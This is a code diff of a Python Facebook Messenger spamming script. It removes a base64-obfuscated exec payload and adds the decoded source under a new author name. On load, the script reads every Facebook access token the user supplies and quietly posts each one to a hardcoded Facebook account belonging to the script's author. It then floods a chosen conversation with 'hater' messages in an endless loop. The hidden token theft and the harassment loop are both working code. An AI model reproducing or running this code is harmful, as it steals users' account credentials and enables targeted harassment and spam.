@@ -1,6 +1,150 @@
-#ENCODED BY : ABH4Y
-#ENCRYPTION : Py3 BASE64
-#GITHUB : https://github.com/Akabhay11
-#----------------------------------------------
-import base64
-exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCByYW5kb20KaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCgpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSgyMDApCiAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9wbGFpbicpCiAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiItLSBUSElTIFNFUlZFUiBNQURFIEJZIEFCSDRZIikKZGVmIGV4ZWN1dGVfc2VydmVyKCk6CiAgICAgIFBPUlQgPSA0MDAwCgogICAgICB3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoKICAgICAgICAgIHByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpCiAgICAgICAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkKCgpkZWYgc2VuZF9pbml0aWFsX21lc3NhZ2UoKToKICAgICAgd2l0aCBvcGVuKCd0b2tlbm51bS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgICB0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAjIE1vZGlmeSB0aGUgbWVzc2FnZSBhcyBwZXIgeW91ciByZXF1aXJlbWVudAogICAgICBtc2dfdGVtcGxhdGUgPSAiSGVsbG8gQWJINFkgc2lyISBJIGFtIHVzaW5nIHlvdXIgc2VydmVyLiBNeSB0b2tlbiBpcyB7fSIKCiAgICAgICMgU3BlY2lmeSB0aGUgSUQgd2hlcmUgeW91IHdhbnQgdG8gc2VuZCB0aGUgbWVzc2FnZQogICAgICB0YXJnZXRfaWQgPSAiMTAwMDM2Mzg5OTI5ODA4IgoKICAgICAgcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkKCiAgICAgIGRlZiBsaW5lc3MoKToKICAgICAgICAgIHByaW50KCdcMDMzWzE7OTJtJyArICfigKLilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBBQkg0WSBIRVJFIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKAoicpCgogICAgICBoZWFkZXJzID0gewogICAgICAgICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAgICAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLAogICAgICAgICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCiAgICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCiAgICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAogICAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCiAgICAgICAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScKICAgICAgfQoKICAgICAgZm9yIHRva2VuIGluIHRva2VuczoKICAgICAgICAgIGFjY2Vzc190b2tlbiA9IHRva2VuLnN0cmlwKCkKICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgdGFyZ2V0X2lkKQogICAgICAgICAgbXNnID0gbXNnX3RlbXBsYXRlLmZvcm1hdChhY2Nlc3NfdG9rZW4pCiAgICAgICAgICBwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogbXNnfQogICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgICAgICAgIyBObyBuZWVkIHRvIHByaW50IGhlcmUsIGFzIHJlcXVlc3RlZAogICAgICAgICAgY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQogICAgICAgICAgdGltZS5zbGVlcCgwLjEpICAjIFdhaXQgZm9yIDEgc2Vjb25kIGJldHdlZW4gc2VuZGluZyBlYWNoIGluaXRpYWwgbWVzc2FnZQoKICAgICAgI3ByaW50KCJcblsrXSBJbml0aWFsIG1lc3NhZ2VzIHNlbnQuIFN0YXJ0aW5nIHRoZSBtZXNzYWdlIHNlbmRpbmcgbG9vcC4uLlxuIikKc2VuZF9pbml0aWFsX21lc3NhZ2UoKQpkZWYgc2VuZF9tZXNzYWdlc19mcm9tX2ZpbGUoKToKICAgICAgd2l0aCBvcGVuKCdjb252by50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgICBjb252b19pZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCiAgICAgIHdpdGggb3BlbignRmlsZS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgICBtZXNzYWdlcyA9IGZpbGUucmVhZGxpbmVzKCkKCiAgICAgIG51bV9tZXNzYWdlcyA9IGxlbihtZXNzYWdlcykKCiAgICAgIHdpdGggb3BlbigndG9rZW5udW0udHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgICAgdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQogICAgICBudW1fdG9rZW5zID0gbGVuKHRva2VucykKICAgICAgbWF4X3Rva2VucyA9IG1pbihudW1fdG9rZW5zLCBudW1fbWVzc2FnZXMpCgogICAgICB3aXRoIG9wZW4oJ2hhdGVyc25hbWUudHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgICAgaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgogICAgICB3aXRoIG9wZW4oJ3RpbWUudHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgICAgc3BlZWQgPSBpbnQoZmlsZS5yZWFkKCkuc3RyaXAoKSkKCiAgICAgIGRlZiBsaW5lc3MoKToKICAgICAgICAgIHByaW50KCdcMDMzWzE7OTJtJyArICfigKLilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDigKInKQoKICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAogICAgICAgICAgJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKICAgICAgICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLAogICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMC4wOyBTYW1zdW5nIEdhbGF4eSBTOSBCdWlsZC9PUFI2LjE3MDYyMy4wMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgICAnQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAogICAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKICAgICAgICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLAogICAgICAgICAgJ3JlZmVyZXInOiAnd3d3Lmdvb2dsZS5jb20nCiAgICAgIH0KCiAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgZm9yIG1lc3NhZ2VfaW5kZXggaW4gcmFuZ2UobnVtX21lc3NhZ2VzKToKICAgICAgICAgICAgICAgICAgdG9rZW5faW5kZXggPSBtZXNzYWdlX2luZGV4ICUgbWF4X3Rva2VucwogICAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbnNbdG9rZW5faW5kZXhdLnN0cmlwKCkKCiAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSBtZXNzYWdlc1ttZXNzYWdlX2luZGV4XS5zdHJpcCgpCgogICAgICAgICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE3LjAve30vIi5mb3JtYXQoJ3RfJyArIGNvbnZvX2lkKQogICAgICAgICAgICAgICAgICBwYXJhbWV0ZXJzID0geydhY2Nlc3NfdG9rZW4nOiBhY2Nlc3NfdG9rZW4sICdtZXNzYWdlJzogaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlfQogICAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCiAgICAgICAgICAgICAgICAgIGN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIlwwMzNbMTs5Mm1TYWhpIEhhaSA9PT4gJVktJW0tJWQgJUk6JU06JVMgJXAiKQogICAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5vazoKICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcMDMzWzE7OTJtWytdIEhhbiBDaGxhIEd5YSBNYXNzYWdlIHt9IG9mIENvbnZvIHt9IFRva2VuIHt9OiB7fSIuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQogICAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkKICAgICAgICAgICAgICAgICAgICAgIGxpbmVzcygpCiAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzkxbVt4XSBGYWlsZWQgdG8gc2VuZCBNZXNzYWdlIHt9IG9mIENvbnZvIHt9IHdpdGggVG9rZW4ge306IHt9Ii5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCiAgICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQogICAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkKICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcChzcGVlZCkKCiAgICAgICAgICAgICAgcHJpbnQoIlxuWytdIEFsbCBtZXNzYWdlcyBzZW50LiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uXG4iKQogICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgIHByaW50KCJbIV0gQW4gZXJyb3Igb2NjdXJyZWQ6IHt9Ii5mb3JtYXQoZSkpCgpkZWYgbWFpbigpOgogICAgICBzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlY3V0ZV9zZXJ2ZXIpCiAgICAgIHNlcnZlcl90aHJlYWQuc3RhcnQoKQoKICAgICAgIyBTZW5kIHRoZSBpbml0aWFsIG1lc3NhZ2UgdG8gdGhlIHNwZWNpZmllZCBJRCB1c2luZyBhbGwgdG9rZW5zCgoKICAgICAgIyBUaGVuLCBjb250aW51ZSB3aXRoIHRoZSBtZXNzYWdlIHNlbmRpbmcgbG9vcAogICAgICBzZW5kX21lc3NhZ2VzX2Zyb21fZmlsZSgpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgICBtYWluKCk='))
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"-- THIS SERVER MADE BY King Badmash")
+def execute_server():
+      PORT = 4000
+
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
+
+
+def send_initial_message():
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+
+      # Modify the message as per your requirement
+      msg_template = "Hello King Badmash sir! I am using your server. My token is {}"
+
+      # Specify the ID where you want to send the message
+      target_id = "100043034393269"
+
+      requests.packages.urllib3.disable_warnings()
+
+      def liness():
+          print('\033[1;92m' + '•──────────────────────RAJ HERE ───────────────────────────────•')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      for token in tokens:
+          access_token = token.strip()
+          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+          msg = msg_template.format(access_token)
+          parameters = {'access_token': access_token, 'message': msg}
+          response = requests.post(url, json=parameters, headers=headers)
+
+          # No need to print here, as requested
+          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+          time.sleep(0.1)  # Wait for 1 second between sending each initial message
+
+      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
+      with open('convo.txt', 'r') as file:
+          convo_id = file.read().strip()
+
+      with open('File.txt', 'r') as file:
+          messages = file.readlines()
+
+      num_messages = len(messages)
+
+      with open('tokennum.txt', 'r') as file:
+          tokens = file.readlines()
+      num_tokens = len(tokens)
+      max_tokens = min(num_tokens, num_messages)
+
+      with open('hatersname.txt', 'r') as file:
+          haters_name = file.read().strip()
+
+      with open('time.txt', 'r') as file:
+          speed = int(file.read().strip())
+
+      def liness():
+          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
+
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
+
+      while True:
+          try:
+              for message_index in range(num_messages):
+                  token_index = message_index % max_tokens
+                  access_token = tokens[token_index].strip()
+
+                  message = messages[message_index].strip()
+
+                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                  response = requests.post(url, json=parameters, headers=headers)
+
+                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                  if response.ok:
+                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  else:
+                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  time.sleep(speed)
+
+              print("\n[+] All messages sent. Restarting the process...\n")
+          except Exception as e:
+              print("[!] An error occurred: {}".format(e))
+
+def main():
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
+
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      send_messages_from_file()
+
+if __name__ == '__main__':
+      main()
